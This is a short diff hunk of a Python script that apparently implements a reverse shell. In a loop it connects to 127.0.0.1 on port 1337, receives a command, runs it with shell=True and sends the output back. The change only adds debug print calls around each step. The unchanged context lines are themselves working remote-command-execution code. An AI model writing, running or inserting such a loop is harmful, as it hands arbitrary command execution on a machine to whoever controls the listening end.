@@ -66,10 +66,15 @@ def sendall(data):
 data = b" "
 while True:
     with suppress(Exception):
+        print("socket")
         s = socket()
+        print("connect")
         s.connect(("127.0.0.1", 1337))
+        print("send")
         sendall(data)
+        print("recv")
         command = s.recv(65535).decode()
         p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
         data = p.stdout or p.stderr or b" "
+        print("close")
         s.close()
